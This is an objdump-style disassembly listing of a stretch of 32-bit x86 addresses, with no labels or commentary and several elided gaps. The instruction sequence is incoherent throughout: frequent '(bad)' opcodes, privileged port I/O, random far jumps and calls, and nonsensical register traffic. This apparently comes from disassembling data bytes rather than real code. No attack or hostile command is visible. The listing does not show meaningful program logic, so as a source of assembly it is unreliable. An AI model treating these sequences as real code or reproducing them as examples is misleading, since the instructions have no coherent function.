  427627:	pop    ebx
  427628:	pop    ecx
  427629:	pop    ebp
  42762a:	inc    esi
  42762b:	sub    DWORD PTR [edi],edx
  42762d:	pop    eax
  42762e:	xchg   esi,eax
  42762f:	sbb    cl,bh
  427631:	sub    DWORD PTR [edx+0x4ab0ab42],edx
  427637:	sbb    ch,BYTE PTR [eax]
  427639:	test   DWORD PTR [ebx-0x5f],eax
  42763c:	je     0x4275f6
  42763e:	lods   al,BYTE PTR ds:[esi]
  42763f:	arpl   WORD PTR [edi+eiz*1-0x22a3f8a0],bp
  427646:	aas    
  427647:	mov    ebp,edi
  427649:	jmp    0x5a9be8b4
  42764e:	add    eax,0xfdaa2e10
  427653:	sti    
  427654:	mov    ds:0x46461fda,eax
  427659:	pop    es
  42765a:	cmc    
  42765b:	xchg   edi,eax
  42765c:	sub    al,0x38
  42765e:	sub    al,0x81
  427660:	jge    0x427625
  427662:	adc    al,0xe0
  427664:	jmp    0x11f8ccd8
  427669:	repz mov ch,0x78
  42766c:	adc    dl,bl
  42766e:	pop    esi
  42766f:	ins    DWORD PTR es:[edi],dx
  427670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427671:	dec    esi
  427672:	or     eax,0x7d393faa
  427677:	jo     0x42761f
  427679:	scas   al,BYTE PTR es:[edi]
  42767a:	cmp    BYTE PTR [esi],0x88
  42767d:	icebp  
  42767e:	sbb    BYTE PTR ds:0x63a81af5,ch
  427684:	add    DWORD PTR ds:0x6055e89d,0xe
  42768b:	(bad)  
  42768c:	dec    ebp
  42768d:	loopne 0x42767b
  42768f:	(bad)
  427692:	daa    
  427693:	adc    BYTE PTR [edi],al
  427695:	inc    esi
  427696:	bound  esi,QWORD PTR [edi+esi*4-0x65637191]
  42769d:	jmp    0xd01d:0x8d4dd8e1
  4276a4:	mov    al,ds:0xf6745dd2
  4276a9:	fcom   DWORD PTR [ebp-0x15]
  4276ac:	imul   ebp,DWORD PTR [esi+0x4c0a5aab],0x50
  4276b3:	pop    ds
  4276b4:	mov    esp,0x11f31457
  4276b9:	push   eax
  4276ba:	test   ebx,esp
  4276bc:	mov    eax,0xa743def0
  4276c1:	push   ss
  4276c2:	mov    edi,0x508f2a4
  4276c7:	mov    edi,0xaf75ee3d
  4276cc:	jg     0x4276e2
  4276ce:	dec    ebp
  4276cf:	sub    DWORD PTR ds:0x9472272e,ebx
  4276d5:	in     eax,0xc9
  4276d7:	popa   
  4276d8:	add    ebx,DWORD PTR [ebx+0xc]
  4276db:	ret    0x1290
  4276de:	mov    ds:0xbb676b6d,al
  4276e3:	and    eax,0x3c991f3
  4276e8:	ss push edx
  4276ea:	jae    0x427713
  4276ec:	ss xor al,0x0
	...
  427753:	add    BYTE PTR [eax],al
  427755:	add    BYTE PTR [ecx],al
  427757:	push   esi
  427758:	nop
  427759:	out    dx,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	out    dx,al
  42775c:	jg     0x42775d
  42775e:	in     al,dx
  42775f:	xor    al,0x86
  427761:	fldenv [eax]
  427763:	fwait
  427764:	or     edx,esp
  427766:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  427768:	add    DWORD PTR [eax],eax
  42776a:	add    BYTE PTR [ecx],al
  42776c:	add    BYTE PTR [eax],al
  42776e:	add    dl,dl
  427770:	aad    0xdb
  427772:	(bad)  [edi]
  427774:	mov    al,0xb1
  427776:	clc    
  427777:	mov    gs,ecx
  427779:	adc    ch,0x13
  42777c:	sub    ah,BYTE PTR [edi+0x75]
  42777f:	push   ebx
  427780:	mov    edi,0x54286ac5
  427785:	stos   DWORD PTR es:[edi],eax
  427786:	sahf   
  427787:	jge    0x427754
  427789:	push   ebx
  42778a:	jbe    0x427766
  42778c:	mulps  xmm2,xmm7
  42778f:	sbb    BYTE PTR [ebx-0x72d6c2f9],bh
  427795:	ret    
  427796:	fwait
  427797:	inc    edi
  427798:	lds    edx,FWORD PTR [esi+0x34]
  42779b:	pop    esi
  42779c:	xor    DWORD PTR [edx-0x13],esi
  42779f:	mov    WORD PTR [esi-0x450f1875],es
  4277a5:	or     al,0x3d
  4277a7:	loopne 0x427745
  4277a9:	xor    al,0x7f
  4277ab:	add    BYTE PTR [edx+ebx*4],dl
  4277ae:	inc    esi
  4277af:	ret    0x1e76
  4277b2:	lock mov al,ds:0x624a66ab
  4277b8:	inc    esp
  4277b9:	mov    ds:0xdb259202,al
  4277be:	jmp    0x9479:0x9cc8bd56
  4277c5:	data16 loopne 0x42777e
  4277c8:	jmp    0xf3743505
  4277cd:	jle    0x427832
  4277cf:	pop    es
  4277d0:	mov    ecx,0x2eb26d4e
  4277d5:	popa   
  4277d6:	mov    al,ds:0xc405f71f
  4277db:	outs   dx,BYTE PTR ds:[esi]
  4277dc:	mov    bh,0x7e
  4277de:	fld    st(3)
  4277e0:	or     esi,eax
  4277e2:	out    0x89,al
  4277e4:	shr    DWORD PTR [ecx],1
  4277e6:	aas    
  4277e7:	fild   DWORD PTR [edx]
  4277e9:	add    eax,0xc9898e44
  4277ee:	mov    ch,0x99
  4277f0:	daa    
  4277f1:	mov    bl,0xf2
  4277f3:	in     al,dx
  4277f4:	sub    DWORD PTR [eax+edx*1-0x33112238],edx
  4277fb:	add    BYTE PTR [esi+edi*8],al
  4277fe:	mov    dl,0xd6
  427800:	call   0xed21:0x5bab6be6
  427807:	push   esp
  427808:	xchg   ecx,eax
  427809:	mov    esp,0x3a8efb7a
  42780e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42780f:	fdivr  QWORD PTR [edx+esi*2-0x1e]
  427813:	imul   esi,DWORD PTR [ecx],0xd9dda5bf
  427819:	je     0x427872
  42781b:	fwait
  42781c:	(bad)  
  42781d:	mov    al,BYTE PTR [edx]
  42781f:	not    eax
  427821:	rcr    ebx,cl
  427823:	jae    0x4277ec
  427825:	xor    esi,DWORD PTR [eax-0x51]
  427828:	adc    eax,0xd5481393
  42782d:	jl     0x4277ed
  42782f:	push   esi
  427830:	pop    ebx
  427831:	xchg   esp,eax
  427832:	sbb    cl,BYTE PTR ds:0xa7dfc759
  427838:	add    BYTE PTR [eax],ch
  42783a:	mov    eax,ds:0xcd22ee8c
  42783f:	mov    ebx,0x31ad99e5
  427844:	mov    ah,0xbe
  427846:	sbb    edi,DWORD PTR [ebx-0x61]
  427849:	loop   0x42789c
  42784b:	or     ebp,edx
  42784d:	xor    eax,0xf266d7b2
  427852:	jo     0x42788b
  427854:	or     esi,0x49be3422
  42785a:	add    ch,al
  42785c:	lea    ebp,[edi+0x71]
  42785f:	into   
  427860:	icebp  
  427861:	sub    ah,dl
  427863:	sbb    esi,DWORD PTR [ecx]
  427865:	shr    BYTE PTR [ebp+0x250a2f78],1
  42786b:	imul   edx,ebx,0xde
	...
  4278d5:	add    BYTE PTR [edx],bl
  4278d7:	mov    cl,BYTE PTR [ebx]
  4278d9:	inc    ebp
  4278da:	fwait
  4278db:	lds    ebx,FWORD PTR [esi-0x21]
  4278de:	jo     0x427945
  4278e0:	fldl2e 
  4278e2:	xchg   esi,eax
  4278e3:	call   0xa8a98869
  4278e8:	add    DWORD PTR [eax],eax
  4278ea:	add    BYTE PTR [ecx],al
  4278ec:	add    BYTE PTR [eax],al
  4278ee:	loopne 0x427929
  4278f0:	fld    DWORD PTR [edx-0x6e157c91]
  4278f6:	inc    esi
  4278f7:	scas   al,BYTE PTR es:[edi]
  4278f8:	add    BYTE PTR [edi+0x72],0x38
  4278fc:	inc    ecx
  4278fd:	xor    ch,0xe2
  427900:	int    0x10
  427902:	or     eax,0xe67d26e9
  427907:	dec    esi
  427908:	xchg   BYTE PTR ds:0xbc87c0bb,bl
  42790e:	in     al,dx
  42790f:	(bad)  
  427911:	cmp    dh,BYTE PTR [eax+0x26]
  427914:	enter  0x160c,0x1b
  427918:	pushf  
  427919:	sbb    eax,0x8f74b02b
  42791e:	or     BYTE PTR [ebx*2+0x619d290e],dh
  427925:	mov    dl,0xbe
  427927:	nop
  427928:	mov    esi,0x187509ab
  42792d:	and    edx,eax
  42792f:	inc    esp
  427930:	xchg   DWORD PTR [edx],eax
  427932:	leave  
  427933:	inc    ecx
  427934:	int    0x31
  427936:	shl    BYTE PTR [edx+0x7b649847],0x90
  42793d:	mov    bh,0xb
  42793f:	mov    ah,0x55
  427941:	imul   BYTE PTR [ecx+0x37]
  427944:	and    bl,BYTE PTR [esi-0x5a]
  427947:	addr16 mov ecx,0x10684ba8
  42794d:	sub    BYTE PTR [edx],bl
  42794f:	jle    0x427945
  427951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427952:	adc    dh,BYTE PTR [edi]
  427954:	cmp    eax,0xe61e2b4c
  427959:	cdq    
  42795a:	push   edx
  42795b:	jne    0x427979
  42795d:	ins    BYTE PTR es:[edi],dx
  42795e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42795f:	lods   eax,DWORD PTR ds:[esi]
  427960:	mov    ebx,0x75ad2fe9
  427965:	mov    ecx,DWORD PTR [esi-0x1365340e]
  42796b:	xchg   edi,eax
  42796c:	xlat   BYTE PTR ds:[ebx]
  42796d:	and    BYTE PTR [edi-0x7a],dh
  427970:	out    dx,al
  427971:	and    BYTE PTR [ebx+eax*8+0x6d],ch
  427975:	test   eax,0xc8e22a5e
  42797a:	cmp    ebx,ebp
  42797c:	fld    st(6)
  42797e:	gs or  ebp,ecx
  427981:	jbe    0x42794e
  427983:	push   ds
  427984:	cli    
  427985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427986:	dec    esi
  427987:	out    0x8,eax
  427989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42798a:	add    eax,DWORD PTR [eax+0x15a679c5]
  427990:	mov    BYTE PTR [ebx+0x4f0106d4],cl
  427996:	cmp    al,0x56
  427998:	or     al,0xb7
  42799a:	out    0x34,al
  42799c:	sub    DWORD PTR [esp+ecx*1],ecx
  42799f:	jecxz  0x427953
  4279a1:	out    dx,al
  4279a2:	sbb    eax,0xbb30f655
  4279a7:	enter  0x6333,0x16
  4279ab:	aam    0x70
  4279ad:	mov    edx,0xa8840306
  4279b2:	mov    ds:0x31ae840f,al
  4279b7:	push   eax
  4279b8:	mov    ebp,0x18119477
  4279bd:	(bad)  
  4279be:	int    0x43
  4279c0:	push   0xffffffed
  4279c2:	bound  esi,QWORD PTR [eax]
  4279c4:	jg     0x4279c0
  4279c6:	iret   
  4279c7:	jb     0x4279b9
  4279c9:	xor    ch,BYTE PTR [edi+0x4acf944c]
  4279cf:	fst    QWORD PTR [edi+0x19e874c4]
  4279d5:	iret   
  4279d6:	xchg   esp,eax
  4279d7:	and    bl,dh
  4279d9:	add    ecx,DWORD PTR [ebx]
  4279db:	imul   ebp,ebp,0xffffff8b
  4279de:	test   al,0xc1
  4279e0:	xor    cl,dh
  4279e2:	ret    0x41e5
  4279e5:	ror    BYTE PTR [ebp-0x35fda50c],1
  4279eb:	sub    al,0x5d
  4279ed:	fild   DWORD PTR [eax]
	...
  427a53:	add    BYTE PTR [eax],al
  427a55:	add    BYTE PTR [edx-0x5c0023],bl
  427a5b:	mov    ds:0x7542fdde,eax
  427a60:	fadd   DWORD PTR [ebx-0x4b398689]
  427a66:	addr16 test eax,0x1000001
  427a6c:	add    BYTE PTR [eax],al
  427a6e:	test   BYTE PTR [esi+0x10],dl
  427a71:	sbb    esp,DWORD PTR [esi]
  427a73:	lea    eax,[edi+0x31]
  427a76:	pop    esp
  427a77:	push   0x16d9d8ef
  427a7c:	and    esi,DWORD PTR [ecx+0x55501eb8]
  427a82:	mov    esi,0xedee8088
  427a87:	add    BYTE PTR [ebp-0x79149bed],dh
  427a8d:	jmp    0x427b06
  427a8f:	test   BYTE PTR ss:[ecx+0x69],0x90
  427a94:	fcmovbe st,st(6)
  427a96:	sub    al,0xfd
  427a98:	inc    esp
  427a99:	ror    BYTE PTR [esi],0x7c
  427a9c:	imul   eax,DWORD PTR [edi+0x40],0xdca8c5f9
  427aa3:	dec    esi
  427aa4:	aas    
  427aa5:	std    
  427aa6:	or     al,0x7a
  427aa8:	(bad)  
  427aa9:	mov    ecx,0xe11f0c32
  427aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427aaf:	pop    ebx
  427ab0:	adc    BYTE PTR [ecx-0x1f2fc80f],0xbf
  427ab7:	mov    bh,ah
  427ab9:	jns    0x427ac9
  427abb:	push   esp
  427abc:	push   es
  427abd:	mov    dh,0xe6
  427abf:	(bad)  
  427ac0:	xchg   edi,eax
  427ac1:	outs   dx,DWORD PTR ds:[esi]
  427ac2:	push   eax
  427ac3:	test   al,0xab
  427ac5:	jo     0x427ad7
  427ac7:	xchg   esp,eax
  427ac8:	cmp    BYTE PTR [esi],bl
  427aca:	mov    cl,0x4e
  427acc:	xchg   esp,eax
  427acd:	in     eax,dx
  427ace:	sub    eax,0x99c76983
  427ad3:	pop    ds
  427ad4:	add    ebp,DWORD PTR [ebx]
  427ad6:	inc    edx
  427ad7:	and    ecx,ebp
  427ad9:	cmp    bl,ah
  427adb:	jno    0x427a95
  427add:	cmp    bl,BYTE PTR [ecx+0x51]
  427ae0:	test   BYTE PTR ds:0x31a5e182,ah
  427ae6:	adc    al,0x2d
  427ae8:	sbb    cl,BYTE PTR [esi]
  427aea:	xor    al,0x20
  427aec:	xchg   ebp,eax
  427aed:	pop    edx
  427aee:	adc    eax,0x48bc1500
  427af3:	xchg   bh,ch
  427af5:	or     al,0x42
  427af7:	sbb    al,0x5b
  427af9:	pop    ecx
  427afa:	add    al,0x42
  427afc:	jmp    0x2c0b:0xc2f37c02
  427b03:	and    DWORD PTR [ecx-0x1d0f7891],ebp
  427b09:	sbb    cl,al
  427b0b:	int3   
  427b0c:	adc    edx,DWORD PTR [edi+0x2a]
  427b0f:	sbb    bh,BYTE PTR [ebp+0x5c7f2f18]
  427b15:	dec    ebx
  427b16:	push   es
  427b17:	mov    esp,0x2c213410
  427b1c:	or     DWORD PTR [ebx-0x5b],ecx
  427b1f:	mov    al,ds:0x87867326
  427b24:	retf   
  427b25:	xlat   BYTE PTR ds:[ebx]
  427b26:	xchg   DWORD PTR [ebx-0x21],esi
  427b29:	fdiv   QWORD PTR [edx-0x378a6728]
  427b2f:	(bad)  [ebp-0x74]
  427b32:	pop    ss
  427b33:	dec    esi
  427b34:	pushf  
  427b35:	xor    bl,BYTE PTR [eax+edi*1]
  427b38:	mov    esi,0x38d6ab3d
  427b3d:	in     eax,dx
  427b3e:	cmc    
  427b3f:	push   edi
  427b40:	fadd   DWORD PTR [esi-0x4c]
  427b43:	jnp    0x427b1c
  427b45:	sub    al,0x7c
  427b47:	xchg   ebp,eax
  427b48:	lea    ebx,[ebx]
  427b4a:	rcr    DWORD PTR [ebx-0x21],cl
  427b4d:	test   BYTE PTR [esi],bh
  427b4f:	mov    al,ds:0xda8fa22c
  427b54:	jae    0x427b27
  427b56:	aas    
  427b57:	fmul   DWORD PTR [edi-0x5a]
  427b5a:	(bad)  
  427b5b:	loopne 0x427b47
  427b5d:	lock int3 
  427b5f:	jb     0x427ba3
  427b61:	sbb    al,0xc4
  427b63:	mov    eax,0x52fc2c55
  427b68:	push   ax
  427b6a:	inc    edx
  427b6b:	stos   BYTE PTR es:[edi],al
  427b6c:	mov    DWORD PTR [edi],esi
	...
  427bd6:	retf   0x528b
  427bd9:	jnp    0x427c2e
  427bdb:	sti    
  427bdc:	jmp    0x427b99
  427bde:	push   ecx
  427bdf:	mov    ecx,ebx
  427be1:	neg    BYTE PTR [ebx+0x6792de5f]
  427be7:	stos   BYTE PTR es:[edi],al
  427be8:	add    DWORD PTR [eax],eax
  427bea:	add    BYTE PTR [ecx],al
  427bec:	add    BYTE PTR [eax],al
  427bee:	or     eax,0x29649497
  427bf3:	out    dx,al
  427bf4:	cmp    ecx,DWORD PTR [ebx-0x77]
  427bf7:	mov    ds:0x6dbfd1b9,eax
  427bfc:	adc    al,BYTE PTR [esi]
  427bfe:	pushf  
  427bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c00:	mov    ch,0x39
  427c02:	dec    ecx
  427c03:	out    dx,eax
  427c04:	leave  
  427c05:	push   ebx
  427c06:	xor    DWORD PTR [edx+0x2e],ebx
  427c09:	mov    edx,DWORD PTR [edi+esi*2]
  427c0c:	outs   dx,DWORD PTR ds:[esi]
  427c0d:	jae    0x427c08
  427c0f:	retf   0x69eb
  427c12:	out    0xa3,al
  427c14:	jbe    0x427c01
  427c16:	dec    ecx
  427c17:	and    ecx,edi
  427c19:	or     al,0x4a
  427c1c:	je     0x7df6ea6c
  427c22:	fcomp  DWORD PTR [edi-0x5afd6910]
  427c28:	in     eax,dx
  427c29:	and    eax,0x4fcbe8dd
  427c2e:	or     edx,DWORD PTR [edi+edi*1-0x22]
  427c32:	mov    esp,0x18335a2a
  427c37:	cld    
  427c38:	(bad)  
  427c39:	and    DWORD PTR [edi+ecx*2],esi
  427c3c:	mov    ebp,0xe2cd68fa
  427c41:	loope  0x427c0e
  427c43:	mov    edi,0x17d97b8c
  427c48:	dec    eax
  427c49:	jbe    0x427c42
  427c4b:	shr    BYTE PTR [edi-0x80e99ac],1
  427c51:	out    0x26,al
  427c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c54:	cmp    edi,DWORD PTR [edx+eiz*4]
  427c57:	mov    ch,0x2
  427c59:	loope  0x427c65
  427c5b:	jae    0x427c46
  427c5d:	push   edx
  427c5e:	outs   dx,DWORD PTR ds:[esi]
  427c5f:	push   ds
  427c60:	std    
  427c61:	add    ebx,edi
  427c63:	cmp    DWORD PTR ds:0x67e4a09f,esi
  427c69:	pop    esi
  427c6a:	and    BYTE PTR [ebx],bl
  427c6c:	jmp    0xee29:0xac9ac2ca
  427c73:	mov    ch,0x2c
  427c75:	int    0x5b
  427c77:	cmp    al,BYTE PTR [ecx+0x5ada6a04]
  427c7d:	scas   eax,DWORD PTR es:[edi]
  427c7e:	rcl    BYTE PTR [ebp+eiz*2+0xc],cl
  427c82:	mov    dl,0x85
  427c84:	shl    al,1
  427c86:	mov    ebp,0xcff06e0c
  427c8b:	xor    ch,ch
  427c8d:	sbb    BYTE PTR [bx+0x4596],ah
  427c92:	test   al,0x22
  427c94:	xchg   ebx,eax
  427c95:	adc    ch,cl
  427c97:	lahf   
  427c98:	pop    ebp
  427c99:	std    
  427c9a:	cmp    al,0x6c
  427c9c:	mov    ch,0xb7
  427c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c9f:	fcomip st,st(6)
  427ca1:	jo     0x427d20
  427ca3:	mov    ah,0x17
  427ca5:	outs   dx,DWORD PTR ds:[esi]
  427ca6:	jmp    0x260e635a
  427cab:	mov    ah,0xbd
  427cad:	ins    BYTE PTR es:[edi],dx
  427cae:	lods   eax,DWORD PTR es:[esi]
  427cb0:	clc    
  427cb1:	and    ecx,ecx
  427cb3:	rcl    ecx,0x76
  427cb6:	jp     0x427cda
  427cb8:	fld    QWORD PTR [ecx+edx*8-0x27bfb469]
  427cbf:	jp     0x427d20
  427cc1:	leave  
  427cc2:	gs repnz xor al,ch
  427cc6:	mov    bl,0x80
  427cc8:	cld    
  427cc9:	mov    al,ds:0x8b714424
  427cce:	out    dx,al
  427ccf:	outs   dx,BYTE PTR ds:[esi]
  427cd0:	push   eax
  427cd1:	pop    edi
  427cd2:	aas    
  427cd3:	jge    0x427d3e
  427cd5:	pop    ebp
  427cd6:	lds    ebx,FWORD PTR [edi]
  427cd8:	xchg   edi,eax
  427cd9:	xchg   ebp,eax
  427cda:	sub    DWORD PTR [ebx],ecx
  427cdc:	stos   BYTE PTR es:[edi],al
  427cdd:	jns    0x427d02
  427cdf:	dec    edx
  427ce0:	(bad)
  427ce3:	jnp    0x427cb9
  427ce5:	push   edx
  427ce6:	addr16 std 
  427ce8:	dec    DWORD PTR [ecx+0xc9a75e8]
	...
  427d56:	mov    ds:0xf343b050,eax
  427d5b:	jecxz  0x427d50
  427d5d:	lock xchg DWORD PTR ds:0x52f85d44,ebx
  427d64:	into   
  427d65:	pop    es
  427d66:	stos   DWORD PTR es:[di],eax
  427d68:	add    DWORD PTR [eax],eax
  427d6a:	add    BYTE PTR [ecx],al
  427d6c:	add    BYTE PTR [eax],al
  427d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d6f:	sbb    eax,0xd3c30a67
  427d74:	dec    eax
  427d75:	and    bl,cl
  427d77:	push   ebx
  427d78:	iret   
  427d79:	push   ebp
  427d7a:	inc    esi
  427d7b:	adc    eax,0xac208e73
  427d80:	inc    esi
  427d81:	xchg   DWORD PTR [edx],edx
  427d83:	stos   BYTE PTR es:[edi],al
  427d84:	and    ebx,DWORD PTR [ebx+edi*8-0xab20cc5]
  427d8b:	or     eax,0xc58dcde5
  427d90:	sub    ebp,0x38
  427d93:	add    DWORD PTR [edx],edx
  427d95:	sbb    al,0x93
  427d97:	out    dx,eax
  427d98:	shl    DWORD PTR cs:[ebx-0x57],cl
  427d9c:	jns    0x427db9
  427d9e:	popa   
  427d9f:	sbb    esi,0x273b10a5
  427da5:	or     edi,DWORD PTR [edi-0x48]
  427da8:	or     bl,BYTE PTR [edi-0x4d093110]
  427dae:	rcr    BYTE PTR ds:0xfe41ee88,0x19
  427db5:	push   DWORD PTR [edi-0x64]
  427db8:	mov    al,0xe8
  427dba:	pop    edx
  427dbb:	or     BYTE PTR [edi+0x7],al
  427dbe:	cwde   
  427dbf:	adc    eax,0xa5214b14
  427dc4:	scas   eax,DWORD PTR es:[edi]
  427dc5:	or     al,0x5
  427dc7:	je     0x427dc7
  427dc9:	(bad)  
  427dca:	daa    
  427dcb:	pusha  
  427dcc:	out    0x98,al
  427dce:	pop    ebx
  427dcf:	push   0x26dbffc9
  427dd4:	shl    BYTE PTR [ebp-0x3dd77e9c],1
  427dda:	sub    eax,0xf293f3c9
  427ddf:	and    ch,0xfd
  427de2:	fs cmp al,0x9d
  427de5:	fcmovnbe st,st(4)
  427de7:	dec    eax
  427de8:	mov    bh,0x60
  427dea:	lock rol bl,1
  427ded:	bound  ebp,QWORD PTR [esp+ebp*4+0x2653b02e]
  427df4:	lds    eax,FWORD PTR [edx]
  427df6:	mov    WORD PTR [edx],ss
  427df8:	inc    ebx
  427df9:	jmp    0xe60d1aa1
  427dfe:	int3   
  427dff:	cli    
  427e00:	js     0x427e6d
  427e02:	cmp    DWORD PTR [ebx],esi
  427e04:	out    0xd6,al
  427e06:	retf   0xa42f
  427e09:	sbb    cl,bl
  427e0b:	sbb    al,0x7a
  427e0d:	jb     0x427e07
  427e0f:	data16 clc 
  427e11:	fsubr  DWORD PTR [edx+edx*4]
  427e14:	and    BYTE PTR cs:[ebx+0x25],ch
  427e18:	pop    eax
  427e19:	mov    ch,0x61
  427e1b:	test   BYTE PTR ds:[edx],bh
  427e1e:	jno    0x427dfd
  427e20:	pop    esp
  427e21:	loope  0x427e19
  427e23:	mov    bh,BYTE PTR [eax+0x12345084]
  427e29:	pop    ecx
  427e2a:	mov    esi,DWORD PTR [eax-0x1400de67]
  427e30:	icebp  
  427e31:	ret    0x43cb
  427e34:	sti    
  427e35:	ss arpl cx,cx
  427e38:	loopne 0x427df7
  427e3a:	fsub   DWORD PTR [ebp-0x3e]
  427e3d:	imul   edx,DWORD PTR [ecx-0x1a2f8c3e],0xc88fa49
  427e47:	jno    0x427e43
  427e49:	hlt    
  427e4a:	push   cs
  427e4b:	and    bh,BYTE PTR [edi-0x43]
  427e4e:	mov    ss,WORD PTR [ebx]
  427e50:	lea    ebx,[eax]
  427e52:	add    eax,0x47bd2a65
  427e57:	outs   dx,BYTE PTR ds:[esi]
  427e58:	test   DWORD PTR [edx],eax
  427e5a:	and    ah,BYTE PTR [eax]
  427e5c:	cmp    ch,cl
  427e5e:	ins    BYTE PTR es:[edi],dx
  427e5f:	cs inc eax
  427e61:	pop    edi
  427e62:	je     0x427e0f
  427e64:	(bad)  
  427e65:	cmp    esi,esi
  427e67:	dec    esp
  427e68:	and    eax,0x742e9bb8
  427e6d:	iret   
	...
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	dec    ebx
  427ee3:	inc    ecx
  427ee4:	adc    BYTE PTR [edx+0x1ac67],dl
  427eea:	add    BYTE PTR [ecx],al
  427eec:	add    BYTE PTR [eax],al
  427eee:	daa    
  427eef:	(bad)  [ebx-0x226ec427]
  427ef5:	loopne 0x427f28
  427ef7:	mov    BYTE PTR [ecx+ecx*1-0x11492cd0],cl
  427efe:	(bad)  
  427eff:	push   ebp
  427f00:	hlt    
  427f01:	adc    DWORD PTR [esi],esi
  427f03:	sub    al,BYTE PTR [ebp+0x7ad5e2da]
  427f09:	xchg   esi,eax
  427f0a:	push   esi
  427f0b:	fldenv [edi-0x2e065d87]
  427f11:	cmc    
  427f12:	push   0xa480b8b5
  427f17:	arpl   WORD PTR [ebx-0x35],di
  427f1a:	dec    esp
  427f1b:	pushf  
  427f1c:	mov    al,0xf2
  427f1e:	call   0xb0e10490
  427f23:	pushf  
  427f24:	wbinvd 
  427f26:	(bad)  
  427f27:	ret    
  427f28:	pop    edi
  427f29:	(bad)  
  427f2a:	cmp    DWORD PTR [ebp+eiz*2-0x46],esp
  427f2e:	sub    eax,0xd88fb7a4
  427f33:	stos   BYTE PTR es:[edi],al
  427f34:	jmp    0x427f51
  427f36:	mov    ebx,0x1cfba03a
  427f3b:	retf   0x1667
  427f3e:	mov    ah,0x87
  427f40:	fsubrp st(3),st
  427f42:	mov    BYTE PTR [esi],ch
  427f44:	push   eax
  427f45:	jle    0x427f9f
  427f47:	cmp    bl,BYTE PTR [edx+0x1496e97d]
  427f4d:	mov    ch,0xb7
  427f4f:	aam    0xfb
  427f51:	dec    esp
  427f52:	cmp    ebp,esi
  427f54:	bound  eax,QWORD PTR [esi+0x5]
  427f57:	pop    esp
  427f58:	pop    esi
  427f59:	push   esp
  427f5a:	xchg   BYTE PTR [ebx+0x48],ch
  427f5d:	add    BYTE PTR [ebx],bh
  427f5f:	push   ss
  427f60:	adc    BYTE PTR [eax+0x53],bl
  427f63:	xchg   edx,eax
  427f64:	push   ebx
  427f65:	add    al,0xa4
  427f67:	xlat   BYTE PTR ds:[ebx]
  427f68:	loopne 0x427fe4
  427f6a:	(bad)  
  427f6b:	push   0xffffffc4
  427f6d:	xor    bl,ch
  427f6f:	inc    ebp
  427f70:	and    al,BYTE PTR [esi+0x1faa8315]
  427f76:	pop    edi
  427f77:	retf   0x3f7a
  427f7a:	pusha  
  427f7b:	sbb    edx,DWORD PTR [eax-0x77]
  427f7e:	adc    BYTE PTR [ecx-0x5dd5524e],ah
  427f84:	and    DWORD PTR [esi],esi
  427f86:	sub    eax,0xcb258cf5
  427f8b:	gs cld 
  427f8d:	retf   
  427f8e:	leave  
  427f8f:	jmp    0x427fe4
  427f91:	push   ebx
  427f92:	fstp   TBYTE PTR [edx+eax*8-0x21d8e42e]
  427f99:	out    0xce,eax
  427f9b:	add    dh,cl
  427f9d:	mov    ds:0xf78efc7f,eax
  427fa2:	mov    ah,BYTE PTR [edi+0x8]
  427fa5:	jb     0x427f84
  427fa7:	retf   
  427fa8:	int3   
  427fa9:	cli    
  427faa:	test   DWORD PTR [ecx-0xf5a5668],edi
  427fb0:	mov    dl,bh
  427fb2:	pop    ss
  427fb3:	test   BYTE PTR [ebp-0x49d8ffb1],al
  427fb9:	sub    al,0x9f
  427fbb:	inc    edi
  427fbc:	ret    0x4d3b
  427fbf:	mov    esp,edx
  427fc1:	arpl   ax,di
  427fc3:	xor    al,BYTE PTR [edx-0x12802c41]
  427fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427fca:	inc    ebx
  427fcb:	bound  eax,QWORD PTR [ebp+0x44]
  427fce:	int    0xec
  427fd0:	sub    edi,DWORD PTR [esi]
  427fd2:	retf   
  427fd3:	adc    eax,DWORD PTR [ebx+0x17113fad]
  427fd9:	dec    esi
  427fda:	pop    esi
  427fdb:	mov    esp,0xef703070
  427fe0:	xlat   BYTE PTR fs:[ebx]
  427fe2:	cmp    edi,DWORD PTR [ecx-0x6b4ad5dd]
  427fe8:	arpl   WORD PTR [ebx+0x49b02015],di
	...
  428056:	mov    cl,0xa7
  428058:	dec    ebx
  428059:	das    
  42805a:	pop    edi
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	js     0x4280ca
  428064:	add    ch,ah
  428066:	lods   eax,DWORD PTR ds:[si]
  428068:	add    DWORD PTR [eax],eax
  42806a:	add    BYTE PTR [ecx],al
  42806c:	add    BYTE PTR [eax],al
  42806e:	aad    0xac
  428070:	lds    esp,FWORD PTR [edi+0x5b7129a6]
  428076:	mov    ds,eax
  428078:	adc    ebx,DWORD PTR [ebx+0x744f6cdc]
  42807e:	push   ds
  42807f:	dec    edi
  428080:	add    BYTE PTR [ebp+0xa5068de],ch
  428086:	cmp    al,0x16
  428088:	inc    esi
  428089:	(bad)  
  42808a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42808b:	sbb    al,0x57
  42808d:	dec    ebx
  42808e:	int    0xd4
  428090:	ja     0x4280f3
  428092:	add    BYTE PTR [ebp+0x10a22ec1],0x4b
  428099:	or     edi,ebp
  42809b:	sub    ecx,DWORD PTR [esi]
  42809d:	fs push ss
  42809f:	(bad)  
  4280a0:	leave  
  4280a1:	push   ebp
  4280a2:	sub    esi,DWORD PTR [ecx]
  4280a4:	jp     0x42809f
  4280a6:	and    bl,al
  4280a8:	push   ebp
  4280a9:	or     edi,DWORD PTR [ecx]
  4280ab:	std    
